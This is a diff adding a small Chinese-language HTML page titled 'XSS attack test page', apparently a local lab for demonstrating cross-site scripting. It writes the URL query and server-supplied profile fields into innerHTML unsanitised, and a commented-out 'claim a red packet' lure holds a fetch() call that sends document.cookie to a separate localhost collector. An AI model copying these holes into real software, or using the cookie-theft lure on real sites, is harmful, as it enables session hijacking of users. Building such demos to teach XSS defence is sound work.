@@ -1,0 +1,48 @@
+<html>
+  <head></head>
+  <body>
+    xss攻击测试页面
+    <button onclick="login()">登录</button><br>
+    个人信息：username: <span id="username"></span>, email: <span id="email"></span><br>
+    <form action="/update" method="POST">
+      <input name="username" placeholder="username" />
+      <input name="email" placeholder="email" />
+      <input type="submit" value="更新">
+    </form>
+    <!-- <div onclick="fetch(`http://127.0.0.1:8083/xss?cookie=${document.cookie}`)">点我领取红包</div> -->
+    <script>
+      function getData() {
+        var xhr = new XMLHttpRequest();
+        xhr.open('get', 'http://127.0.0.1:8082/userinfo', true);
+        xhr.onreadystatechange = function(e) {
+          var res = e.currentTarget;
+          if (res.readyState === XMLHttpRequest.DONE && res.status === 200) {
+            console.log(res.responseText);
+            const { username, email } = JSON.parse(res.responseText).data;
+            document.querySelector('#username').innerHTML = username;
+            document.querySelector('#email').innerHTML = email;
+          }
+        }
+        xhr.withCredentials = true;
+        xhr.send();
+      }
+      if (location.search) {
+        document.querySelector('#username').innerHTML = decodeURIComponent(location.search).replace('?username=', '');
+      } else {
+        getData();
+      }
+      function login() {
+        var xhr = new XMLHttpRequest();
+        xhr.open('post', 'http://127.0.0.1:8082/login', true);
+        xhr.onreadystatechange = function(e) {
+          var res = e.currentTarget;
+          if (res.readyState === XMLHttpRequest.DONE && res.status === 200) {
+            alert(res.responseText)
+          }
+        }
+        xhr.withCredentials = true;
+        xhr.send();
+      }
+    </script>
+  </body>
+</html>
